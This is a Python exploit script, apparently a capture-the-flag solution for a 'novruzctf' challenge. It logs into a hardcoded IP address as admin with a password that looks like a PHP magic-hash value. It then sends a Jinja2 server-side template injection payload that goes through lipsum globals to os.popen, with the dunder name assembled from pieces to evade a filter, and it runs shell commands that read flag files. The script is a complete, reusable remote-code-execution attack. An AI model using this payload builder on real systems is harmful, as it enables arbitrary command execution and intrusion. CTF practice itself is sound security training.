#!/usr/bin/env python3
import re
import sys
from typing import Optional

import requests

BASE_URL = "http://103.54.19.209"
LOGIN_PATH = "/"
DASHBOARD_PATH = "/dashboard.php"
USERNAME = "admin"
PASSWORD = "240610708"


def extract_report(html: str) -> Optional[str]:
    m = re.search(r"<h1>Report:\s*(.*?)</h1>", html, re.S)
    if not m:
        return None
    return m.group(1)


def build_payload(cmd: str) -> str:
    expr = (
        "lipsum"
        "|attr('_'*2+'globals'+'_'*2)"
        "|attr('get')('os')"
        "|attr('popen')('" + cmd.replace("'", "\\'") + "')"
        "|attr('read')()"
    )
    return "AA{{\n" + expr + "\n}}BB"


def run_cmd(session: requests.Session, cmd: str) -> str:
    payload = build_payload(cmd)
    r = session.post(BASE_URL + DASHBOARD_PATH, data={"title": payload}, timeout=20)
    r.raise_for_status()

    if "Hacking attempt detected!" in r.text:
        raise RuntimeError("Payload blocked by filter")

    report = extract_report(r.text)
    if report is None:
        raise RuntimeError("Could not parse report output")

    if report.startswith("AA") and report.endswith("BB"):
        report = report[2:-2]
    return report


def main() -> int:
    s = requests.Session()

    # Login
    login_resp = s.post(
        BASE_URL + LOGIN_PATH,
        data={"login": USERNAME, "pwd": PASSWORD},
        allow_redirects=False,
        timeout=15,
    )
    login_resp.raise_for_status()

    if login_resp.status_code != 302 or "dashboard.php" not in login_resp.headers.get("Location", ""):
        print("[-] Login failed", file=sys.stderr)
        return 1

    # Candidate commands. First successful flag match wins.
    cmds = [
        "cat /flag.txt 2>/dev/null",
        "cat /flag 2>/dev/null",
        "cat /app/flag.txt 2>/dev/null",
        "cat /app/flag 2>/dev/null",
        "cat /root/flag.txt 2>/dev/null",
        "cat /root/flag 2>/dev/null",
    ]

    for cmd in cmds:
        try:
            out = run_cmd(s, cmd)
        except Exception:
            continue

        flag_match = re.search(r"novruzctf\{[^}\n\r]+\}", out)
        if flag_match:
            print(flag_match.group(0))
            return 0

    print("[-] Flag not found", file=sys.stderr)
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
